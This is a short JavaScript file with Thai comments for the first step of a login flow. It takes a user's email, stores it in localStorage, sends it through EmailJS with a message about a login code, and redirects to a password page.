// เริ่มต้น EmailJS
(function() {
    emailjs.init("mlukDfCOP1G1UcOsL");  // Public Key จาก EmailJS
})();

function goToNextPage() {
    let email = document.getElementById("email").value.trim();

    if (email === "") {
        alert("กรุณากรอกอีเมลก่อน!");
        return;
    }

    // บันทึกอีเมลลง LocalStorage เพื่อใช้ในหน้าถัดไป
    localStorage.setItem("userEmail", email);

    // ตรวจสอบค่าที่จะส่งไปยัง EmailJS
    console.log("📩 ส่งค่าไป EmailJS:", email);

    // สร้างตัวแปรที่ต้องการส่งไป EmailJS
    var templateParams = {
        user_email: email, // ต้องตรงกับชื่อที่ใช้ใน EmailJS Template
        message: `📩 อีเมลของคุณ: ${email}\n🔐 กรุณาใช้รหัสที่ได้รับสำหรับเข้าสู่ระบบ`
    };

    // ส่งอีเมล
    emailjs.send("service_0ali0id", "template_3z31m7i", templateParams)
        .then(function(response) {
            console.log("📨 อีเมลถูกส่งสำเร็จ!", response.status, response.text);
        }, function(error) {
            console.error("❌ ส่งอีเมลล้มเหลว", error);
        });

    // ไปหน้ากรอกรหัสผ่าน
    window.location.href = "password.html";
}
